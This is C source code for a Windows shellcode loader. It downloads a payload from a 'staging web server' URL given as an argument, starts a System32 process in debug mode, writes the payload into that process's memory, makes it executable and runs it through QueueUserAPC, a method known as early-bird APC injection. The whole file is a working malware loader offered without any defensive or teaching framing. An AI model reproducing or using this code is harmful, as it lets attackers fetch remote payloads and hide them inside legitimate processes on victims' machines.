#include <Windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "Wininet.lib");

//#define LOG_DEBUG_MSG

#ifdef LOG_DEBUG_MSG
#define DEBUG_PRINT(fmt, ...) \
	printf("[DEBUG] (%s:%d) " fmt "\n", __FILE__, __LINE__,  ##__VA_ARGS__)
#else
#define	DEBUG_PRINT(fmt, ...) ((void)0)
#endif // !LOG_DEBUG_MSG

// Retrieves payload from the staging web server
BOOL FetchBlob(
	IN		LPCWSTR	lpszUrl,
	OUT		PBYTE* ppBlob,
	OUT		PSIZE_T	psBlobSize
) {
	BOOL bSTATE = TRUE;

	HINTERNET	hInternet = NULL;
	HINTERNET	hInternetFile = NULL;

	PBYTE		pBuffer = NULL;
	SIZE_T		sBufferSize = 0;

	DWORD		dwBytesRead = 0;

	BYTE		pTmpBuffer[4096];

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		DEBUG_PRINT("InternetOpenW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	hInternetFile = InternetOpenUrlW(
		hInternet,
		lpszUrl,
		NULL,
		NULL,
		INTERNET_FLAG_HYPERLINK,
		NULL
	);

	if (hInternetFile == NULL) {
		DEBUG_PRINT("InternetOpenUrlW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpBuffer, sizeof(pTmpBuffer), &dwBytesRead)) {
			DEBUG_PRINT("InternetReadFile failed with error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		if (!(dwBytesRead > 0)) {
			break;
		}

		if (pBuffer == NULL)
			pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
		else
			pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, sBufferSize + dwBytesRead);

		if (pBuffer == NULL) {
			DEBUG_PRINT("Failed to (re)allocate pBuffer. Last error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		memcpy(pBuffer + sBufferSize, pTmpBuffer, dwBytesRead);

		sBufferSize += dwBytesRead;
	}

	*ppBlob = pBuffer;
	*psBlobSize = sBufferSize;

_CleanUp:
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet) {
		InternetCloseHandle(hInternet);
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	}
	RtlSecureZeroMemory(pTmpBuffer, 4096);

	return bSTATE;
}

//void PrintHexData(PBYTE pByteArray, SIZE_T sSize) {
//	for (int i = 0; i < sSize; i++) {
//		printf("%0.2X ", pByteArray[i]);
//		if (i % 16 == 15)
//			putchar('\n');
//	}
//	putchar('\n');
//}

BOOL CreateSuspendedProcess(
	IN	LPCWSTR	lpszProcessName,
	OUT	PHANDLE	phProcess,
	OUT	PHANDLE	phThread,
	OUT	PDWORD	pdwProcessID
) {
	BOOL	bSTATE = TRUE;
	WCHAR	lpszTargetProcessPath[MAX_PATH * 2];
	WCHAR	WnDir[MAX_PATH];

	STARTUPINFO	Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableW(L"WINDIR", WnDir, MAX_PATH)) {
		DEBUG_PRINT("GetEnvironmentVariableW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	swprintf_s(lpszTargetProcessPath, MAX_PATH * 2, L"%s\\System32\\%s", WnDir, lpszProcessName);

	if (!CreateProcessW(NULL, lpszTargetProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
		DEBUG_PRINT("CreateProcessW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	*phProcess	= Pi.hProcess;
	*phThread	= Pi.hThread;
	*pdwProcessID = Pi.dwProcessId;

// End of Function
_EoF:
	if (*phProcess == NULL || *phThread == NULL)
		bSTATE = FALSE;
	return bSTATE;
}

BOOL ScheduleRun(
	IN	HANDLE	hProcess,
	IN	HANDLE	hThread,
	IN	PBYTE	pBlob,
	IN	SIZE_T	sBlobSize
) {
	BOOL	bSTATE = TRUE;
	PVOID	pAddress = NULL;
	DWORD	dwOldProtection = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	pAddress = VirtualAllocEx(hProcess, NULL, sBlobSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pAddress == NULL) {
		DEBUG_PRINT("VirtualAllocEx failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pBlob, sBlobSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sBlobSize) {
		DEBUG_PRINT("WriteProcessMemory failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sBlobSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DEBUG_PRINT("VirtualProtectEx failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		DEBUG_PRINT("QueueUserAPC failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _EoF;
	}

// End of Function
_EoF:
	return bSTATE;
}

int wmain(int argc, wchar_t** argv) {
	PBYTE	pBlob = NULL;
	SIZE_T	sBlobSize = 0;
	HANDLE	hProcess = NULL;
	HANDLE	hThread = NULL;
	DWORD	dwProcessID = 0;

	FetchBlob(argv[1], &pBlob, &sBlobSize);
	//PrintHexData(pBlob, sBlobSize);

	CreateSuspendedProcess(argv[2], &hProcess, &hThread, &dwProcessID);

	ScheduleRun(hProcess, hThread, pBlob, sBlobSize);

	DebugActiveProcessStop(dwProcessID);

#ifdef LOG_DEBUG_MSG
	system("PAUSE");
#endif // !LOG_DEBUG_MSG
	return 0;
}
